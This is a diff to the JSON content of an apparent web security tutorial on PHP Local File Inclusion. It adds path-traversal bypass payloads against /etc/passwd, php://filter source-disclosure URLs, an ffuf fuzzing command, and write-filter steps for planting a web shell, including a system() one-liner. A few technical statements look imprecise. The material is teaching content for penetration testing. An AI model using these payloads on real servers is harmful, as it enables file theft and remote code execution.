@@ -1455,51 +1455,63 @@
         "code": "root:x:0:0:root:/root:/bin/bash ..."
       },
       {
+        "type": "section_heading",
+        "id": "lfi-bypasses",
+        "text": "LFI Bypasses (Bypassing Protections)"
+      },
+      {
+        "type": "paragraph",
+        "id": "bypass-intro",
+        "text": "Web applications often apply protections against file inclusion. Below are practical examples of how to bypass these filters."
+      },
+      {
         "type": "order_block",
-        "id": "lfi-step-3",
-        "text": "Now we will try to read the source code of the same file instead of executing it."
+        "id": "bypass-ex-1",
+        "text": "1. <highlight>Non-Recursive Bypass</highlight>: If the server removes '../', nest the traversal characters so they reform after the filter runs."
       },
       {
         "type": "code_block",
-        "id": "checking-command",
+        "id": "bypass-code-1",
         "language": "bash",
-        "code": "curl -s 'http://10.10.184.98/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d"
+        "code": "http://example.com/index.php?page=....//....//....//etc/passwd"
       },
       {
-        "type": "explanation",
-        "id": "pgp-definition",
-        "title": "Breaking Down the Command",
-        "items": [
-          "We use the <highlight>php://filter</highlight> wrapper to encode the file in <highlight>base64</highlight>.",
-          "We cannot retrieve the raw PHP source directly because it would execute on the server instead of being displayed.",
-          "After retrieving the base64-encoded content, we decode it locally to view the actual source code safely."
-        ]
+        "type": "order_block",
+        "id": "bypass-ex-2",
+        "text": "2. <highlight>URL Encoding Bypass</highlight>: Use encoding to hide dots and slashes from basic string-matching firewalls."
+      },
+      {
+        "type": "code_block",
+        "id": "bypass-code-2",
+        "language": "bash",
+        "code": "# URL Encoded: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\nhttp://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      },
+      {
+        "type": "order_block",
+        "id": "bypass-ex-3",
+        "text": "3. <highlight>Approved Path Bypass</highlight>: If the app requires the path to start with a specific folder like '/var/www/html/images/'."
+      },
+      {
+        "type": "code_block",
+        "id": "bypass-code-3",
+        "language": "bash",
+        "code": "http://example.com/index.php?page=/var/www/html/images/../../../../etc/passwd"
+      },
+      {
+        "type": "order_block",
+        "id": "bypass-ex-4",
+        "text": "4. <highlight>Null Byte Bypass</highlight> (PHP < 5.5): Terminate the string before an automatically appended extension like '.php' is added."
+      },
+      {
+        "type": "code_block",
+        "id": "bypass-code-4",
+        "language": "bash",
+        "code": "http://example.com/index.php?page=../../../../etc/passwd%00"
       },
       {
         "type": "order_block",
         "id": "initial-access",
-        "text": "Let's examine the retrieved source code."
-      },
-      {
-        "type": "output_block",
-        "id": "checking-command",
-        "language": "bash",
-        "code": "<?php\n  //echo \"Hello World\";\n  if(isset($_GET['file'])) {\n    $file = $_GET['file'];\n    include($file);\n  }\n?>"
-      },
-      {
-        "type": "explanation",
-        "id": "pgp-definition",
-        "title": "Analyzing the Source Code",
-        "items": [
-          "The script checks for the parameter using <highlight>if(isset($_GET['file']))</highlight>.",
-          "There is no input validation or sanitization applied to the user-controlled parameter.",
-          "The function <highlight>include($file);</highlight> directly includes the user-supplied value, which makes this highly vulnerable to LFI."
-        ]
-      },
-      {
-        "type": "order_block",
-        "id": "initial-access",
-        "text": "Basic LFI is done here, if you really want to learn about how can we use filter wrapper then take a look at <highlight>Filter chain generator</highlight> which is using filter wrapper."
+        "text": "Basic LFI concepts and common bypasses are covered here. For filter-based exploitation, refer to the Filter Wrapper section."
       }
     ]
   },
@@ -1625,27 +1637,56 @@
         "id": "lfi-filter-intro",
         "title": "php://filter",
         "items": [
-          "It allows you to apply filters before PHP reads or writes a file.",
-          "In short, you are telling PHP: <highlight>Before processing this file, modify its content.</highlight>"
+          "It allows you to access different I/O streams at the application level (standard I/O, memory streams, etc.).",
+          "In short, you are telling PHP: <highlight>Before processing this file, modify its content.</highlight>",
+          "This is crucial for reading PHP source code, as normal LFI would execute the code instead of displaying it."
         ]
       },
       {
         "type": "order_block",
         "id": "lfi-step-1",
-        "text": "Let's look at a basic example."
+        "text": "Let's look at a basic example of Source Code Disclosure."
       },
       {
         "type": "code_block",
         "id": "example-base64",
-        "code": "http://TargetIP/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php"
+        "language": "bash",
+        "code": "http://TargetIP/index.php?language=php://filter/read=convert.base64-encode/resource=config"
       },
       {
         "type": "explanation",
         "id": "lfi-filter-understanding",
         "title": "Understanding the Command",
         "items": [
-          "Here we used <highlight>convert.base64-encode</highlight> to encode the file so that PHP does not execute the code.",
-          "The server returns the content in <highlight>base64</highlight> format, which we can decode locally to read the source code."
+          "Here we used <highlight>convert.base64-encode</highlight> so that the PHP file is rendered as a string rather than executed.",
+          "The <highlight>resource</highlight> parameter is required; it specifies the stream/file to filter.",
+          "If the extension (like .php) is automatically appended by the app, you only need the filename (e.g., 'config' instead of 'config.php')."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "fuzzing-php",
+        "text": "Fuzzing for PHP Files"
+      },
+      {
+        "type": "paragraph",
+        "id": "fuzzing-intro",
+        "text": "Before extracting source code, you must identify available PHP pages using tools like <highlight>ffuf</highlight> or <highlight>gobuster</highlight>."
+      },
+      {
+        "type": "code_block",
+        "id": "ffuf-command",
+        "language": "bash",
+        "code": "ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://TargetIP/FUZZ.php"
+      },
+      {
+        "type": "explanation",
+        "id": "fuzzing-tip",
+        "title": "Pro-Tip for LFI Fuzzing",
+        "items": [
+          "Do not ignore <highlight>301</highlight>, <highlight>302</highlight>, or <highlight>403</highlight> status codes.",
+          "Even if a page is forbidden or redirects, an LFI vulnerability might still allow you to read its underlying source code.",
+          "Once one file is read, scan it for references to other internal PHP files (like database configs or includes)."
         ]
       },
       {
@@ -1659,7 +1700,7 @@
         "title": "What is read?",
         "items": [
           "<highlight>read=</highlight> tells PHP to apply filters when the file is being read.",
-          "If only one filter is used, PHP assumes read mode automatically, so writing <highlight>read=</highlight> is optional.",
+          "If only one filter is used, PHP assumes read mode automatically.",
           "When chaining multiple filters, <highlight>read=</highlight> must be explicitly defined."
         ]
       },
@@ -1671,17 +1712,16 @@
       {
         "type": "code_block",
         "id": "example-read-chain",
+        "language": "bash",
         "code": "http://TargetIP/secret-script.php?file=php://filter/read=convert.base64-encode|string.rot13/resource=secret-script.php"
       },
       {
         "type": "explanation",
         "id": "lfi-read-understanding",
-        "title": "Understanding the Chained Filters",
+        "title": "Understanding Chained Filters",
         "items": [
-          "This command first <highlight>encodes</highlight> the file using base64.",
-          "Then it applies <highlight>string.rot13</highlight> to rotate the encoded string.",
-          "Multiple filters can be combined using the <highlight>|</highlight> symbol.",
-          "Filters are applied from left to right."
+          "Combined using the <highlight>|</highlight> symbol and applied from left to right.",
+          "Useful for bypassing complex WAFs that might flag a simple base64 string but miss a ROT13-encoded base64 string."
         ]
       },
       {
@@ -1695,31 +1735,30 @@
         "title": "What is write?",
         "items": [
           "<highlight>write=</highlight> applies filters when data is being written to a file.",
-          "It modifies the data before it is saved.",
-          "This only works if the application uses file-writing functions such as <highlight>file_put_contents()</highlight> or <highlight>fwrite()</highlight>.",
-          "In a normal LFI using include(), <highlight>write=</highlight> does not work because include() only reads files."
+          "Requires the application to use functions like <highlight>file_put_contents()</highlight>.",
+          "In a normal LFI using include(), <highlight>write=</highlight> does not work because include() only reads."
         ]
       },
       {
         "type": "code_block",
         "id": "example-write-filter",
+        "language": "bash",
         "code": "php://filter/write=convert.base64-decode/resource=shell.php"
       },
       {
         "type": "explanation",
         "id": "lfi-write-understanding",
-        "title": "Understanding the Command",
+        "title": "Logic for Writing Shells",
         "items": [
-          "For this to work, the application must write user-controlled data into the file.",
-          "You must supply base64-encoded content (for example in a POST body).",
-          "The write filter will decode the data first, then save the decoded result into <highlight>shell.php</highlight>.",
-          "If there is no file-writing function in the application, this technique will not work."
+          "You supply base64-encoded payload (e.g., a web shell) in a parameter that the app writes to disk.",
+          "The filter decodes it on-the-fly, saving the clean PHP code to the target resource.",
+          "This bypasses filters that block strings like '<?php system($_GET[0]); ?>' in transit."
         ]
       },
       {
         "type": "order_block",
         "id": "lfi-summary",
-        "text": "So far we have covered the two main modes supported by php://filter: read and write."
+        "text": "By mastering these wrappers, you move from just reading system files to disclosing full web application logic and potentially achieving Remote Code Execution."
       }
     ]
   },
